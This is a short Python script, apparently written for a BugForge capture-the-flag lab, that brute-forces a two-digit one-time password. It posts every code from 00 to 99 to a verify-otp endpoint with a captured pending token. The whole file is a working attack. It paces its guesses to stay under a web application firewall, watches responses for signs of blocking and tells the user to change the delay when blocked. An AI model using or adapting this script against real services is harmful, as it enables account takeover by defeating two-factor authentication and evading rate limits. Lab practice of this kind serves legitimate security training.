# script by Claudi
# script for Bugorge room talking works, brute force otp
import requests, time

BASE = "https://lab-1789029959010-tn85pz.labs-app.bugforge.io/"
TOKEN = "5c340401be78f35d8c6438adacb36093"   # grab it right before running
DELAY = 1.5                    # seconds between guesses — tune this

s = requests.Session()

for i in range(100):
    code = f"{i:02d}"
    r = s.post(f"{BASE}/api/verify-otp",
               json={"pendingToken": TOKEN, "code": code})
    body = r.text.lower()

    if r.status_code == 200 and "invalid" not in body:
        print(f"[+] HIT code={code}")
        print(r.text)
        break
    if "block" in body or "waf" in body or "prevent" in body:
        print(f"[!] WAF tripped at {code} — increase DELAY")
        break
    if "expired" in body or "session" in body:
        print(f"[!] token died at {code} — grab fresh token / decrease DELAY")
        break

    print(f"[-] {code} -> {r.status_code}")
    time.sleep(DELAY)
